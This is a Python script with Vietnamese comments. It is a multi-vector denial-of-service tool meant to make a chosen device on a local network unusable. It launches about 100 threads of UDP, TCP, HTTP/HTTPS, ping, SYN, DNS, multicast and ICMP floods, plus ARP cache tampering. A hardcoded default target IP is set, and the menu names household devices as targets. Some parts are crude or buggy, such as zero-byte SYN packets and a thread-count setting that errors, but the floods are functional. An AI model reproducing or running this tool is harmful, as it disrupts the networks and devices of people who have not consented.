import socket
import threading
import time
import os
import random
import subprocess
import sys

# ===== CẤU HÌNH =====
ROUTER_IP = "192.168.1.1"
TARGET_IP = "26.50.200.248"  # <<< THAY IP MÁY CẦN LAG
THOI_GIAN = 60  # Giây
SO_LUONG_THREAD = 100  # Số luồng tấn công

# ===== MÀU SẮC =====
class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    RESET = '\033[0m'

# ===== 1. UDP FLOOD SIÊU MẠNH =====
def udp_super(target_ip):
    """Gửi UDP với tần suất cực cao"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * 65507  # Maximum UDP packet
    
    # Danh sách port quan trọng
    ports = [53, 80, 443, 8080, 22, 25, 110, 143, 993, 995, 
             3306, 3389, 5432, 27015, 27016, 27017, 28015, 28016]
    
    while True:
        try:
            for port in ports:
                # Gửi 10 gói liên tiếp cho mỗi port
                for _ in range(10):
                    sock.sendto(payload, (target_ip, port))
                    sock.sendto(payload, (target_ip, port+1))
                    sock.sendto(payload, (target_ip, port+2))
        except:
            pass

# ===== 2. TCP FLOOD SIÊU MẠNH =====
def tcp_super(target_ip):
    """Tạo hàng ngàn kết nối TCP"""
    sockets = []
    while True:
        try:
            for port in [80, 443, 8080, 22, 25, 110, 143, 3306, 3389]:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect((target_ip, port))
                # Gửi dữ liệu rác để giữ kết nối
                s.send(b"X" * 10240)  # 10KB
                sockets.append(s)
                
                # Giữ tối đa 5000 kết nối
                if len(sockets) > 5000:
                    for _ in range(100):
                        try:
                            old = sockets.pop(0)
                            old.close()
                        except:
                            pass
        except:
            pass

# ===== 3. HTTP FLOOD SIÊU MẠNH =====
def http_super(target_ip):
    """Gửi HTTP request với header siêu dài"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, 80))
            # Header dài 10000 bytes
            header = b"GET / HTTP/1.1\r\n" + b"X-Header: " + b"A"*10000 + b"\r\n\r\n"
            s.send(header * 10)  # Gửi 10 lần
            s.close()
        except:
            pass

# ===== 4. HTTPS FLOOD =====
def https_super(target_ip):
    """Gửi request HTTPS"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, 443))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n" * 50)
            s.close()
        except:
            pass

# ===== 5. PING FLOOD (CẦN ADMIN) =====
def ping_super(target_ip):
    """Gửi ping khổng lồ"""
    while True:
        try:
            if os.name == 'nt':  # Windows
                subprocess.run(['ping', '-l', '65500', '-n', '1', target_ip], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.run(['ping', '-s', '65500', '-c', '1', target_ip],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

# ===== 6. SYN FLOOD =====
def syn_flood(target_ip):
    """Gửi gói SYN (cần raw socket)"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        while True:
            # Tạo gói SYN giả
            packet = b"\x00" * 40  # Tạo packet đơn giản
            try:
                sock.sendto(packet, (target_ip, 80))
                sock.sendto(packet, (target_ip, 443))
            except:
                pass
    except:
        pass  # Không có quyền admin

# ===== 7. DNS AMPLIFICATION =====
def dns_super(target_ip):
    """Gửi DNS query lớn"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Tạo domain siêu dài
    long_domain = b".".join([b"a" * 63 for _ in range(20)])
    
    while True:
        try:
            for _ in range(50):  # Gửi 50 lần liên tiếp
                dns_query = b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                for part in long_domain.split(b'.'):
                    dns_query += bytes([len(part)]) + part
                dns_query += b"\x00\x00\x01\x00\x01"
                
                # Gửi đến DNS server của máy đích
                sock.sendto(dns_query, (target_ip, 53))
                
                # Gửi qua router để tăng tải
                sock.sendto(dns_query, (ROUTER_IP, 53))
        except:
            pass

# ===== 8. MULTICAST FLOOD =====
def multicast_super(target_ip):
    """Gửi multicast gây nhiễu"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    payload = b"X" * 1400
    mc_ips = ["224.0.0.1", "224.0.0.2", "224.0.0.251", "239.255.255.250"]
    
    while True:
        try:
            for mc_ip in mc_ips:
                sock.sendto(payload, (mc_ip, 1900))
                sock.sendto(payload, (mc_ip, 5353))
                sock.sendto(payload, (target_ip, 1900))
        except:
            pass

# ===== 9. ARP SPOOFING =====
def arp_super(target_ip):
    """Đánh lừa ARP (cần admin)"""
    if os.name == 'nt':
        while True:
            try:
                # Xóa ARP cache
                os.system(f'arp -d {target_ip} >nul 2>&1')
                # Thêm ARP giả
                os.system(f'arp -s {target_ip} {ROUTER_IP} >nul 2>&1')
                time.sleep(0.1)
            except:
                pass
    else:
        while True:
            try:
                os.system(f'arp -d {target_ip}')
                os.system(f'arp -s {target_ip} {ROUTER_IP}')
                time.sleep(0.1)
            except:
                pass

# ===== 10. ICMP FLOOD =====
def icmp_super(target_ip):
    """Gửi ICMP với kích thước lớn"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        packet = b"\x08\x00\x00\x00\x00\x00\x00\x00" + b"X" * 65500
        while True:
            sock.sendto(packet, (target_ip, 0))
            sock.sendto(packet, (ROUTER_IP, 0))
    except:
        pass

# ===== MONITOR =====
def monitor():
    """Hiển thị thông tin tấn công"""
    while True:
        try:
            import psutil
            net = psutil.net_io_counters()
            total_gb = (net.bytes_recv + net.bytes_sent) / 1024**3
            print(f"\r📊 Data: {total_gb:.2f}GB  |  📡 DL: {net.bytes_recv/1024**3:.2f}GB  UL: {net.bytes_sent/1024**3:.2f}GB  |  🧵 Threads: {threading.active_count()}", end="", flush=True)
        except:
            pass
        time.sleep(1)

# ===== MAIN =====
def main():
    global TARGET_IP
    
    print(Color.PURPLE + "=" * 75)
    print("🔥🔥🔥 LAG SIÊU MẠNH - TẤN CÔNG ĐA TẦNG 🔥🔥🔥")
    print("=" * 75 + Color.RESET)
    
    # Nhập IP máy cần lag
    print(Color.YELLOW + "\n📡 Các máy trong mạng:")
    print("   ping 192.168.1.100 → Laptop")
    print("   ping 192.168.1.101 → Điện thoại")
    print("   ping 192.168.1.102 → TV")
    print("   ping 192.168.1.103 → Máy tính khác" + Color.RESET)
    
    ip_input = input("\n" + Color.BLUE + "Nhập IP máy cần lag (VD: 192.168.1.100): " + Color.RESET)
    if ip_input:
        TARGET_IP = ip_input
    
    so_luong = input(Color.BLUE + "Số luồng tấn công (mặc định 100, càng cao càng lag): " + Color.RESET)
    if so_luong:
        SO_LUONG_THREAD = int(so_luong)
    
    thoi_gian = input(Color.BLUE + "Thời gian lag (giây, mặc định 60): " + Color.RESET)
    if thoi_gian:
        THOI_GIAN = int(thoi_gian)
    
    print(Color.RED + "\n" + "=" * 75)
    print(f"🎯 MÁY BỊ LAG: {TARGET_IP}")
    print(f"🧵 SỐ LUỒNG: {SO_LUONG_THREAD}")
    print(f"⏱️ THỜI GIAN: {THOI_GIAN} giây")
    print("=" * 75 + Color.RESET)
    
    confirm = input(Color.RED + "\n⚠️ Nhập 'yes' để xác nhận tấn công: " + Color.RESET)
    if confirm.lower() != 'yes':
        print("Đã hủy.")
        return
    
    print(Color.GREEN + "\n🚀 KHỞI ĐỘNG TẤN CÔNG..." + Color.RESET)
    
    # ===== TẤN CÔNG TẤT CẢ CÁC PHƯƠNG THỨC =====
    
    # 1. UDP Flood - 20 luồng
    for i in range(20):
        threading.Thread(target=udp_super, args=(TARGET_IP,), daemon=True).start()
    
    # 2. TCP Flood - 30 luồng
    for i in range(30):
        threading.Thread(target=tcp_super, args=(TARGET_IP,), daemon=True).start()
    
    # 3. HTTP Flood - 15 luồng
    for i in range(15):
        threading.Thread(target=http_super, args=(TARGET_IP,), daemon=True).start()
    
    # 4. HTTPS Flood - 15 luồng
    for i in range(15):
        threading.Thread(target=https_super, args=(TARGET_IP,), daemon=True).start()
    
    # 5. Ping Flood - 10 luồng
    for i in range(10):
        threading.Thread(target=ping_super, args=(TARGET_IP,), daemon=True).start()
    
    # 6. SYN Flood - 10 luồng
    for i in range(10):
        threading.Thread(target=syn_flood, args=(TARGET_IP,), daemon=True).start()
    
    # 7. DNS Amplification - 10 luồng
    for i in range(10):
        threading.Thread(target=dns_super, args=(TARGET_IP,), daemon=True).start()
    
    # 8. Multicast - 5 luồng
    for i in range(5):
        threading.Thread(target=multicast_super, args=(TARGET_IP,), daemon=True).start()
    
    # 9. ARP Spoofing - 3 luồng
    for i in range(3):
        threading.Thread(target=arp_super, args=(TARGET_IP,), daemon=True).start()
    
    # 10. ICMP Flood - 5 luồng
    for i in range(5):
        threading.Thread(target=icmp_super, args=(TARGET_IP,), daemon=True).start()
    
    # 11. Monitor
    threading.Thread(target=monitor, daemon=True).start()
    
    print(Color.RED + "\n" + "=" * 75)
    print("🔥🔥🔥 ĐANG TẤN CÔNG MÁY: " + TARGET_IP)
    print("📱 MÁY NÀY SẼ BỊ LAG NẶNG - KHÔNG DÙNG ĐƯỢC")
    print("💻 MÁY CỦA BẠN VẪN BÌNH THƯỜNG")
    print("=" * 75 + Color.RESET)
    
    # Đếm ngược
    for i in range(THOI_GIAN, 0, -1):
        print(f"\r⏱️ Còn {i:3d} giây...  🔥 Đang tấn công {TARGET_IP}", end="", flush=True)
        time.sleep(1)
    
    print("\n\n" + Color.GREEN + "=" * 75)
    print("✅ HẾT THỜI GIAN!")
    print(f"🔓 Máy {TARGET_IP} đã được giải phóng")
    print("💡 Mạng trở lại bình thường")
    print("=" * 75 + Color.RESET)

if __name__ == "__main__":
    try:
        import psutil
    except:
        print("Đang cài đặt psutil...")
        os.system('pip install psutil')
        import psutil
    
    main()